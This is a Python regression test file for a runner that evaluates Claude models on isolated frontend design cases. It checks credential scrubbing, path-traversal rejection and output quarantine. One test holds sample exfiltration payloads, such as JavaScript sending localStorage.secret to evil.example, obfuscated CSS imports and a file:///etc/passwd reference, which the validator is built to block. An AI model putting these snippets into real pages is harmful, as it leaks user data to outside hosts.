@@ -1,0 +1,387 @@
+#!/usr/bin/env python3
+"""Regression tests for the isolated Claude evaluation runner."""
+
+from __future__ import annotations
+
+import hashlib
+import json
+import os
+import shutil
+import subprocess
+import tempfile
+import unittest
+from contextlib import contextmanager
+from pathlib import Path
+from typing import Iterator
+
+
+ROOT = Path(__file__).resolve().parents[2]
+RUNNER = ROOT / "evals" / "run_claude_case.sh"
+CONTEXT_PATHS = (
+    "wow-frontend-design/SKILL.md",
+    "wow-frontend-design/references/creative-direction.md",
+    "wow-frontend-design/references/anti-ai-slop.md",
+    "wow-frontend-design/references/mobile-responsive.md",
+    "wow-frontend-design/references/localization.md",
+    "wow-frontend-design/references/typography-webfonts.md",
+    "wow-frontend-design/references/implementation.md",
+    "wow-frontend-design/references/component-composition.md",
+    "wow-frontend-design/references/quality-gates.md",
+    "wow-frontend-design/references/weak-model-playbook.md",
+    "wow-frontend-design/references/model-routing.md",
+)
+SAFE_HTML = """<!doctype html><html lang="zh-Hant"><head>
+<link rel="stylesheet" href="./styles.css"><title>Runner test</title></head>
+<body><main id="main"><a href="#main">Main</a></main><script src="app.js"></script></body></html>"""
+SAFE_CSS = "body { color: #111; background: #fff; }"
+SAFE_JS = "document.querySelector('a').addEventListener('click', () => {});"
+
+
+def fixed_target(root: Path, model: str, case_id: str) -> Path:
+    return root / "evals" / f"claude-{model}-{case_id}"
+
+
+class ClaudeRunnerTests(unittest.TestCase):
+    @contextmanager
+    def fixture(self) -> Iterator[tuple[Path, Path, Path]]:
+        with tempfile.TemporaryDirectory() as directory:
+            root = Path(directory)
+            runner = root / "evals" / "run_claude_case.sh"
+            runner.parent.mkdir(parents=True)
+            shutil.copy2(RUNNER, runner)
+
+            for model in ("haiku", "opus"):
+                showcase_target = fixed_target(root, model, "showcase")
+                showcase_target.mkdir()
+                (showcase_target / "BRIEF.md").write_text("# Fixed showcase test brief\n", encoding="utf-8")
+                fixed_target(root, model, "product-dashboard").mkdir()
+            fixed_target(root, "haiku", "product-dashboard-remake").mkdir()
+            shared_brief = root / "evals" / "briefs" / "product-dashboard.md"
+            shared_brief.parent.mkdir()
+            shared_brief.write_text("# Shared product dashboard test brief\n", encoding="utf-8")
+            target = fixed_target(root, "haiku", "showcase")
+            for relative in CONTEXT_PATHS:
+                path = root / relative
+                path.parent.mkdir(parents=True, exist_ok=True)
+                path.write_text(f"# {path.name}\n", encoding="utf-8")
+
+            capture = root / "capture"
+            capture.mkdir()
+            binary = root / "bin" / "claude"
+            binary.parent.mkdir()
+            binary.write_text(
+                """#!/usr/bin/env bash
+set -euo pipefail
+if [[ "${1:-}" == "--version" ]]; then
+  printf '%s\\n' '2.1.999 (Claude Code test stub)'
+  exit 0
+fi
+/usr/bin/env | sort > "$RUNNER_TEST_CAPTURE/env.txt"
+printf '%s\\n' "$@" > "$RUNNER_TEST_CAPTURE/args.txt"
+command cat > "$RUNNER_TEST_CAPTURE/prompt.txt"
+printf '%s' "${RUNNER_TEST_HTML}" > index.html
+printf '%s' "${RUNNER_TEST_CSS}" > styles.css
+printf '%s' "${RUNNER_TEST_JS}" > app.js
+""",
+                encoding="utf-8",
+            )
+            binary.chmod(0o755)
+            yield root, target, capture
+
+    def run_case(
+        self,
+        root: Path,
+        target: Path,
+        capture: Path,
+        *,
+        auth_mode: str = "official",
+        html: str = SAFE_HTML,
+        css: str = SAFE_CSS,
+        js: str = SAFE_JS,
+        model: str = "haiku",
+        case_id: str | None = None,
+        extra_env: dict[str, str] | None = None,
+    ) -> subprocess.CompletedProcess[str]:
+        environment = os.environ.copy()
+        environment.update(
+            {
+                "PATH": f"{root / 'bin'}{os.pathsep}{environment.get('PATH', '')}",
+                "CLAUDE_AUTH_MODE": auth_mode,
+                "CLAUDE_RUN_ID": "test-run-001",
+                "RUNNER_TEST_CAPTURE": str(capture),
+                "RUNNER_TEST_HTML": html,
+                "RUNNER_TEST_CSS": css,
+                "RUNNER_TEST_JS": js,
+            }
+        )
+        if extra_env:
+            environment.update(extra_env)
+        arguments = [str(root / "evals" / "run_claude_case.sh"), model]
+        if case_id is None:
+            arguments.append(str(target))
+        else:
+            arguments.extend(("--case", case_id))
+        return subprocess.run(
+            arguments,
+            cwd=root,
+            env=environment,
+            text=True,
+            capture_output=True,
+            timeout=20,
+            check=False,
+        )
+
+    @staticmethod
+    def captured_environment(path: Path) -> dict[str, str]:
+        return {
+            key: value
+            for line in path.read_text(encoding="utf-8").splitlines()
+            for key, value in [line.split("=", 1)]
+        }
+
+    def test_official_mode_clears_provider_environment_but_preserves_oauth(self) -> None:
+        contaminated = {
+            "ANTHROPIC_API_KEY": "dummy-api-key",
+            "ANTHROPIC_AUTH_TOKEN": "dummy-auth-token",
+            "ANTHROPIC_BASE_URL": "http://127.0.0.1:9999",
+            "ANTHROPIC_MODEL": "dummy-model",
+            "ANTHROPIC_CUSTOM_MODEL_OPTION": "dummy-custom-model",
+            "ANTHROPIC_DEFAULT_HAIKU_MODEL": "dummy-haiku",
+            "CLAUDE_CODE_USE_VERTEX": "1",
+            "CLAUDE_CODE_USE_BEDROCK": "1",
+            "CLAUDE_CODE_USE_MANTLE": "1",
+            "CLAUDE_CODE_USE_FOUNDRY": "1",
+            "CLAUDE_CODE_USE_ANTHROPIC_AWS": "1",
+            "ANTHROPIC_AWS_API_KEY": "dummy-aws-platform-key",
+            "AWS_BEARER_TOKEN_BEDROCK": "dummy-bedrock-key",
+            "ANTHROPIC_FOUNDRY_AUTH_TOKEN": "dummy-foundry-token",
+            "AWS_ACCESS_KEY_ID": "dummy-aws",
+            "GOOGLE_APPLICATION_CREDENTIALS": "/tmp/dummy-google.json",
+            "AZURE_CLIENT_SECRET": "dummy-azure",
+            "CLAUDE_CODE_OAUTH_TOKEN": "dummy-official-oauth",
+        }
+        with self.fixture() as (root, target, capture):
+            completed = self.run_case(root, target, capture, extra_env=contaminated)
+            self.assertEqual(0, completed.returncode, completed.stderr)
+            captured = self.captured_environment(capture / "env.txt")
+            for name in contaminated:
+                if name != "CLAUDE_CODE_OAUTH_TOKEN":
+                    self.assertNotIn(name, captured)
+            self.assertEqual("dummy-official-oauth", captured["CLAUDE_CODE_OAUTH_TOKEN"])
+
+            manifest = json.loads((target / "run-manifest.json").read_text(encoding="utf-8"))
+            self.assertEqual("test-run-001", manifest["run_id"])
+            self.assertEqual("official", manifest["auth_mode"])
+            self.assertEqual("2.1.999 (Claude Code test stub)", manifest["cli"]["version"])
+            self.assertEqual("haiku", manifest["model"]["requested_alias"])
+            self.assertEqual(
+                {"id": "showcase", "target": "evals/claude-haiku-showcase"},
+                manifest["case"],
+            )
+            self.assertIsNone(manifest["model"]["resolved_exact_model"])
+            self.assertEqual("not_reported_by_cli", manifest["model"]["resolution_status"])
+            self.assertTrue(manifest["environment"]["official_oauth_state_preserved"])
+            self.assertIn("ANTHROPIC_API_KEY", manifest["environment"]["cleared_variable_names"])
+            self.assertNotIn("CLAUDE_CODE_OAUTH_TOKEN", manifest["environment"]["cleared_variable_names"])
+            self.assertEqual(len(CONTEXT_PATHS), len(manifest["context"]["trusted_files"]))
+            self.assertTrue(all(len(item["sha256"]) == 64 for item in manifest["context"]["trusted_files"]))
+            self.assertEqual(
+                hashlib.sha256((root / "evals" / "run_claude_case.sh").read_bytes()).hexdigest(),
+                manifest["runner"]["sha256"],
+            )
+            self.assertEqual({"index.html", "styles.css", "app.js"}, {item["path"] for item in manifest["outputs"]})
+            for output in manifest["outputs"]:
+                self.assertEqual(
+                    hashlib.sha256((target / output["path"]).read_bytes()).hexdigest(),
+                    output["sha256"],
+                )
+
+    def test_inherited_mode_keeps_intentional_api_environment(self) -> None:
+        with self.fixture() as (root, target, capture):
+            completed = self.run_case(
+                root,
+                target,
+                capture,
+                auth_mode="inherited",
+                extra_env={"ANTHROPIC_API_KEY": "intentional", "CLAUDE_CODE_USE_VERTEX": "1"},
+            )
+            self.assertEqual(0, completed.returncode, completed.stderr)
+            captured = self.captured_environment(capture / "env.txt")
+            self.assertEqual("intentional", captured["ANTHROPIC_API_KEY"])
+            self.assertEqual("1", captured["CLAUDE_CODE_USE_VERTEX"])
+            manifest = json.loads((target / "run-manifest.json").read_text(encoding="utf-8"))
+            self.assertEqual([], manifest["environment"]["cleared_variable_names"])
+            self.assertFalse(manifest["environment"]["official_oauth_state_preserved"])
+
+    def test_legacy_two_argument_call_keeps_fixed_alias_and_safe_mode(self) -> None:
+        with self.fixture() as (root, target, capture):
+            completed = self.run_case(root, target, capture)
+            self.assertEqual(0, completed.returncode, completed.stderr)
+            arguments = (capture / "args.txt").read_text(encoding="utf-8").splitlines()
+            self.assertIn("--safe-mode", arguments)
+            self.assertEqual("haiku", arguments[arguments.index("--model") + 1])
+            self.assertEqual("Write", arguments[arguments.index("--allowedTools") + 1])
+
+    def test_explicit_product_dashboard_case_maps_each_model_to_fixed_target(self) -> None:
+        for model in ("haiku", "opus"):
+            with self.subTest(model=model), self.fixture() as (root, _, capture):
+                target = fixed_target(root, model, "product-dashboard")
+                completed = self.run_case(
+                    root,
+                    target,
+                    capture,
+                    model=model,
+                    case_id="product-dashboard",
+                )
+                self.assertEqual(0, completed.returncode, completed.stderr)
+                self.assertIn(
+                    "# Shared product dashboard test brief",
+                    (capture / "prompt.txt").read_text(encoding="utf-8"),
+                )
+                manifest = json.loads((target / "run-manifest.json").read_text(encoding="utf-8"))
+                self.assertEqual(model, manifest["model"]["requested_alias"])
+                self.assertEqual(
+                    {
+                        "id": "product-dashboard",
+                        "target": f"evals/claude-{model}-product-dashboard",
+                    },
+                    manifest["case"],
+                )
+                self.assertEqual(
+                    "evals/briefs/product-dashboard.md",
+                    manifest["context"]["brief"]["path"],
+                )
+                self.assertEqual(
+                    {"index.html", "styles.css", "app.js", "run-manifest.json"},
+                    {path.name for path in target.iterdir()},
+                )
+
+    def test_single_remake_maps_only_haiku_to_fresh_target_and_shared_brief(self) -> None:
+        with self.fixture() as (root, _, capture):
+            target = fixed_target(root, "haiku", "product-dashboard-remake")
+            completed = self.run_case(
+                root,
+                target,
+                capture,
+                model="haiku",
+                case_id="product-dashboard-remake",
+            )
+            self.assertEqual(0, completed.returncode, completed.stderr)
+            manifest = json.loads((target / "run-manifest.json").read_text(encoding="utf-8"))
+            self.assertEqual(
+                {
+                    "id": "product-dashboard-remake",
+                    "target": "evals/claude-haiku-product-dashboard-remake",
+                },
+                manifest["case"],
+            )
+            self.assertEqual(
+                "evals/briefs/product-dashboard.md",
+                manifest["context"]["brief"]["path"],
+            )
+            self.assertIn(
+                "wow-frontend-design/references/anti-ai-slop.md",
+                {item["path"] for item in manifest["context"]["trusted_files"]},
+            )
+
+        with self.fixture() as (root, _, capture):
+            rejected = self.run_case(
+                root,
+                fixed_target(root, "haiku", "product-dashboard-remake"),
+                capture,
+                model="opus",
+                case_id="product-dashboard-remake",
+            )
+            self.assertEqual(2, rejected.returncode, rejected.stderr)
+            self.assertIn("single approved haiku remediation run", rejected.stderr)
+            self.assertFalse((capture / "args.txt").exists())
+
+    def test_case_and_legacy_target_reject_traversal_or_arbitrary_paths(self) -> None:
+        with self.fixture() as (root, target, capture):
+            attempts = (
+                (target, "../product-dashboard"),
+                (root / "evals" / "missing" / ".." / "claude-haiku-showcase", None),
+                (fixed_target(root, "opus", "showcase"), None),
+            )
+            for attempted_target, case_id in attempts:
+                with self.subTest(target=str(attempted_target), case_id=case_id):
+                    completed = self.run_case(
+                        root,
+                        attempted_target,
+                        capture,
+                        case_id=case_id,
+                    )
+                    self.assertEqual(2, completed.returncode, completed.stderr)
+            self.assertFalse((capture / "args.txt").exists())
+
+    def test_validator_rejects_external_and_local_resource_sinks(self) -> None:
+        cases = {
+            "protocol-relative": {"html": SAFE_HTML.replace("<main", '<img src="//evil.example/pixel"><main')},
+            "css-import": {"css": '@\\69mport "//evil.example/x.css";'},
+            "comment-split-css-import": {"css": '@im/**/port "//evil.example/x.css";'},
+            "meta-refresh": {"html": SAFE_HTML.replace("<title>", '<meta http-equiv="refresh" content="0;url=//evil.example"><title>')},
+            "form-action": {"html": SAFE_HTML.replace("<main", '<form action="/collect"><button>Send</button></form><main')},
+            "dynamic-image": {"js": 'new Image().src="//evil.example/" + localStorage.secret;'},
+            "bracket-resource-assignment": {"js": 'document.querySelector("img")["src"] = "//evil.example/pixel";'},
+            "unclosed-inline-script": {"html": SAFE_HTML.replace("</body>", "<script>fetch('/collect')</body>")},
+            "external-anchor": {"html": SAFE_HTML.replace('href="#main"', 'href="https://evil.example/"')},
+            "local-file": {"html": SAFE_HTML.replace("<main", '<img src="file:///etc/passwd"><main')},
+            "root-relative-resource": {"html": SAFE_HTML.replace("<main", '<img src="/pixel"><main')},
+        }
+        for label, payload in cases.items():
+            with self.subTest(label=label), self.fixture() as (root, target, capture):
+                completed = self.run_case(
+                    root,
+                    target,
+                    capture,
+                    html=payload.get("html", SAFE_HTML),
+                    css=payload.get("css", SAFE_CSS),
+                    js=payload.get("js", SAFE_JS),
+                )
+                self.assertEqual(1, completed.returncode, completed.stderr)
+                self.assertIn("forbidden by this isolated evaluation", completed.stderr)
+                for name in ("index.html", "styles.css", "app.js", "run-manifest.json"):
+                    self.assertFalse((target / name).exists())
+
+    def test_rejected_output_can_be_preserved_only_in_external_quarantine(self) -> None:
+        rejected_js = 'fetch("https://evil.example/collect");'
+        with tempfile.TemporaryDirectory() as quarantine, self.fixture() as (root, target, capture):
+            completed = self.run_case(
+                root,
+                target,
+                capture,
+                js=rejected_js,
+                extra_env={"CLAUDE_REJECTED_OUTPUT_DIR": quarantine},
+            )
+            self.assertEqual(1, completed.returncode, completed.stderr)
+            self.assertIn("evaluator-owned quarantine", completed.stderr)
+            for name in ("index.html", "styles.css", "app.js", "run-manifest.json"):
+                self.assertFalse((target / name).exists())
+
+            preserved = Path(quarantine) / "test-run-001"
+            record = json.loads((preserved / "rejection.json").read_text(encoding="utf-8"))
+            self.assertEqual("rejected_before_publish", record["status"])
+            self.assertEqual("isolated_output_policy", record["reason"])
+            self.assertEqual({"index.html", "styles.css", "app.js"}, {item["path"] for item in record["files"]})
+            self.assertEqual(rejected_js, (preserved / "app.js").read_text(encoding="utf-8"))
+            for item in record["files"]:
+                self.assertEqual(
+                    hashlib.sha256((preserved / item["path"]).read_bytes()).hexdigest(),
+                    item["sha256"],
+                )
+
+        with self.fixture() as (root, target, capture):
+            completed = self.run_case(
+                root,
+                target,
+                capture,
+                js=rejected_js,
+                extra_env={"CLAUDE_REJECTED_OUTPUT_DIR": str(root / "capture")},
+            )
+            self.assertEqual(2, completed.returncode, completed.stderr)
+            self.assertIn("outside the repository", completed.stderr)
+            self.assertFalse((capture / "args.txt").exists())
+
+
+if __name__ == "__main__":
+    unittest.main()
